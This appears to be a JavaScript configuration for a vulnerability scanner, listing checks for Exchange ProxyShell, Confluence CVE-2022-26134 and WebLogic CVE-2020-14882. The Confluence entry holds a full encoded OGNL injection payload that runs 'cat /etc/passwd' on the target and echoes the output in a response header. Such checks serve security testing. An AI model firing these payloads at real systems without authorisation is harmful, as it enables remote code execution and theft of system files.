export const poc = [{
    // UNTESTED!!! remove and test version
    title: "RCE: Exchange Server Proxyshell (CVE-2021-34473)",
    rootPaths: [
        "/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@foo.com"
    ],
    detectResponses: ["Connectivity Endpoint"],
    tags: ["exchange"],
    cat: "skull",
    critLevel: 3
},
{
    title: "RCE: Confluence Server (CVE-2022-26134)",
    rootPaths: [
        //'%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat /etc/passwd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
        "/%24%7B%28%23a%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%22cat /etc/passwd%22%29%2EgetInputStream%28%29%2C%22utf%2D8%22%29%29%2E%28%40com%2Eopensymphony%2Ewebwork%2EServletActionContext%40getResponse%28%29%2EsetHeader%28%22X%2DCmd%2DResponse%22%2C%23a%29%29%2E%28%40com%2Eopensymphony%2Ewebwork%2EServletActionContext%40getResponse%28%29%2EsendError%28500%29%29%7D/"
    ],
    detectHeaders: ["x-cmd-response"],
    tags: ["confluence"],
    cat: "skull",
    critLevel: 3
},
{
    // UNTESTED!!!
    title: "RCE: Weblogic Console (CVE-2020-14882)",
    rootPaths: [
        "/console/css/%252e%252e%252fconsole.portal"
    ],
    detectResponses: ["200"],
    tags: ["weblogic"],
    cat: "cat-panic",
    critLevel: 3
}]